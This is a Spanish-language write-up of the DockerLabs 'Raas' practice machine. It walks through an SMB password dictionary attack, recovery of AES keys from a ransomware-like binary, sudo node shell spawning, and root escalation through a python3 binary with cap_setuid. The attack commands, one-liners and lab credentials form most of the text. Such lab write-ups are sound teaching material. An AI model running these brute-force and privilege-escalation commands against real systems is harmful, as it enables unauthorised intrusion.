---
title: Raas
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-02-05
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-raas/raas_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - smb
  - tcp
  - misconfigurations
  - reverse engineering
  - cryptography
  - sudo abuse
  - data leaks
  - capabilities
  - information gathering
  - misconfiguration exploitation
  - data leak exploitation
  - user pivoting
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ ping -c 1 127.17.0.2       
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.056 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.056/0.056/0.056/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.2 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds/// Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ sudo nmap -sCV -p22,139,445 -vvv 127.17.0.2 -oN nmap2
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 07:ba:24:3e:67:86:71:2c:1c:f9:c2:65:0d:b0:f2:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBiCnhsWR8QjFGjyZWrlbYO8EblinSNA5N7E4tgIfX9KCZhkjjqPYA74Zs8G3bfsF/80XZbG8AqkUrH2wNkVFpk=
|   256 e2:7a:9a:9d:58:2a:07:05:5f:e9:01:b6:7e:0d:e7:da (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILySsfVMVKQ4kse66WRJkVdes0HTknsXPf0ggDzn89i4
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28228/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 57177/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29351/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25605/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-02-05T00:01:56
|_  start_date: N/A
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

---
## Misconfiguration & Data Leak Exploitation

Comenzando con el escaneo del servicio SMB, pude ver que el recurso compartido `ransomware` está disponible, lo que me permitió hacer una exploración inicial.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ smbclient -L //127.17.0.2/ -N 
```

![](assets/img/dockerlabs-writeup-raas/raas1_1.png)

No puede enumerar ningun recurso compartido.

![](assets/img/dockerlabs-writeup-raas/raas1_2.png)

Utilicé enum4linux para enumerar los usuarios del sistema y luego intentar realizar un ataque de diccionario.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ enum4linux 127.17.0.2
```

![](assets/img/dockerlabs-writeup-raas/raas1_3.png)

```terminal
/home/kali/Documents/dockerlabs/raas:-$ echo 'patricio\nbob\ncalamardo' > users.txt
```
```terminal
/home/kali/Documents/dockerlabs/raas:-$ sudo nxc smb 127.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
SMB         127.17.0.2      445    KALI             [+] KALI\patricio:basketball
```

![](assets/img/dockerlabs-writeup-raas/raas1_4.png)

Una vez obtenida la credencial válida para el usuario `patricio`, accedí al recurso SMB.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ smbclient //127.17.0.2/ransomware -U patricio%basketball
```

![](assets/img/dockerlabs-writeup-raas/raas1_5.png)

Dentro del recurso compartido, descargué varios archivos, `private.txt`, `nota.txt` y `pokemongo`. Al revisar el contenido de `nota.txt`, observé que el objetivo es descifrar el archivo `private.txt`.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ cat nota.txt
```

![](assets/img/dockerlabs-writeup-raas/raas2_1.png)

---

```terminal
/home/kali/Documents/dockerlabs/raas:-$ file pokemongo
pokemongo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6f1b5eb6016808f7847871479cf0e8898f32f67a, for GNU/Linux 3.2.0, not stripped
```

En este paso, realizo ingeniería inversa con [Decompiler Explorer](https://dogbolt.org/) sobre el archivo `pokemongo`, un ejecutable ELF que parece tener funciones para cifrar archivos, en este caso, el archivo `private.txt`.

Al observar el código, se identificaron dos valores en formato hexadecimal que corresponden a claves de cifrado`local_438 = 0x3837363534333231;`:`local_430 = 0x3635343332313039;`. Estas claves están siendo utilizadas en la función `encrypt_files_in_directory`, lo que sugiere que son relevantes para desencriptar los archivos.

![](assets/img/dockerlabs-writeup-raas/raas2_2.png)

El fragmento de código muestra que el programa obtiene el nombre del host y, si es "dockerlabs", verifica la existencia de ciertos archivos. Si ambos archivos existen, se invoca la función `recon` y luego se configuran las claves de cifrado


En términos de ASCII, estos valores corresponden a las siguientes cadenas:

```terminal
/home/kali/Documents/dockerlabs/raas:-$ echo '0x3837363534333231' | xxd -r
87654321
```
```terminal
/home/kali/Documents/dockerlabs/raas:-$ echo '0x3635343332313039' | xxd -r
65432109
```

El resultado es que el IV (vector de inicialización) que se utiliza para el cifrado AES es:

* `IV = 1234567895601234`.

![](assets/img/dockerlabs-writeup-raas/raas2_3.png)

En este fragmento de código de la función `recon`, se están concatenando varias cadenas de texto a `param_1` utilizando la función `builtin_strncpy`. Al examinar las cadenas que se copian, podemos construir la segunda clave en formato ASCII.

* `Key = y0qpfjxbd79047929ew0omqad3f4gscl`

---

Utilizo [Cyber Chef](https://toolbox.itsec.tamu.edu/) para desencriptar el contenido de `private.txt`.

* Primero, obtengo la cadena hexadecimal de `private.txt`.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ hexdump -e '16/2 "%04x "' private.txt
1157 5297 0eb1 051f f7dc 5693 023c 1324 b6c2 bf7e 4868 7e22 67aa d992 be76 d50f0e2c 8554 f25e b092 9628 888b 75cc 8668
```

* Con `Swap endianness` cambio el orden de los bytes para preparar los datos para desencriptar.

```
57 11 97 52 b1 0e 1f 05 dc f7 93 56 3c 02 24 13 c2 b6 7e bf 68 48 22 7e aa 67 92 d9 76 be 0f d5 2c 0e 54 85 5e f2 92 b0 28 96 8b 88 cc 75 68 86
```

* Convierto las dos claves AES en base64.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ echo -n 'y0qpfjxbd79047929ew0omqad3f4gscl' | base64
eTBxcGZqeGJkNzkwNDc5MjlldzBvbXFhZDNmNGdzY2w=
```
```terminal
/home/kali/Documents/dockerlabs/raas:-$ echo '1234567895601234' | base64
MTIzNDU2Nzg5MDEyMzQ1Ngo=
```

![](assets/img/dockerlabs-writeup-raas/raas2_4.png)

De esta forma, obtengo las credenciales SSH. `las credenciales ssh son: bob:56000nmqpL`.

```terminal
/home/kali/Documents/dockerlabs/raas:-$ ssh bob@127.17.0.2
bob@127.17.0.2's password: 56000nmqpL
```
```terminal
bob@kali:~$ id
uid=1002(bob) gid=1002(bob) groups=1002(bob),100(users)
```

---
## User Pivoting 1

```terminal
bob@kali:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
patricio:x:1001:1001:,,,:/home/patricio:/bin/bash
bob:x:1002:1002:,,,:/home/bob:/bin/bash
calamardo:x:1003:1003:,,,:/home/calamardo:/bin/bash
```

```terminal
bob@kali:~$ sudo -l
Matching Defaults entries for bob on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on kali:
    (calamardo) NOPASSWD: /bin/node
```

Identifico que el usuario `bob` tiene permisos para ejecutar `/bin/node` como el usuario `calamardo` sin necesidad de contraseña.

Segun [GTFoBins](https://gtfobins.github.io/gtfobins/node/#sudo) puedo obtener una shell con privilegios del usuario `calamardo`.

```terminal
bob@kali:~$ sudo -u calamardo /bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

$ id
uid=1003(calamardo) gid=1003(calamardo) groups=1003(calamardo),100(users)
```
```terminal
/home/kali/Documents/dockerlabs/raas:-$ script /dev/null -c bash
```

---
## User Pivoting 2

En el archivo `.bashrc` se encuentra una contraseña en texto claro asociada al usuario `patricio`.

```terminal
calamardo@kali:~$ cat .bashrc | grep patricio
# should be on the output of commands, not on the prompt patricio:Jap0n16ydcbd***
```

```terminal
/home/kali/Documents/dockerlabs/raas:-$ ssh patricio@127.17.0.2
patricio@127.17.0.2's password: Jap0n16ydcbd***
```

```terminal
patricio@kali:~$ id
uid=1001(patricio) gid=1001(patricio) groups=1001(patricio),100(users)
```

---
## Privilege Escalation

Al ejecutar un comando para listar archivos y directorios con permisos de escritura para el grupo, identifico un directorio interesante `.ssh`.

```terminal
patricio@kali:~$ for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done
./.local
./.ssh
```

En el directorio, se encuentra un archivo llamado `python3` con permisos de ejecución, lo cual no es habitual.

```terminal
patricio@kali:~$ ls -al .ssh/
-rwxr-xr-x 1 patricio patricio 8019136 Jan  5 16:48 python3

patricio@kali:~$ getcap .ssh/python3
.ssh/python3 cap_setuid=ep
```

Al verificar las capacidades del archivo `python3`, se observa que tiene la capacidad `cap_setuid=ep` activada, lo que indica que puede cambiar el ID de usuario efectivo a `root`.

Según [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities), esta capacidad puede ser aprovechada para escalar privilegios.

```terminal
patricio@kali:~$ .ssh/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# script /dev/null -c bash
Script started, output log file is '/dev/null'.

root@kali:~# id
uid=0(root) gid=1001(patricio) groups=1001(patricio),100(users)
```
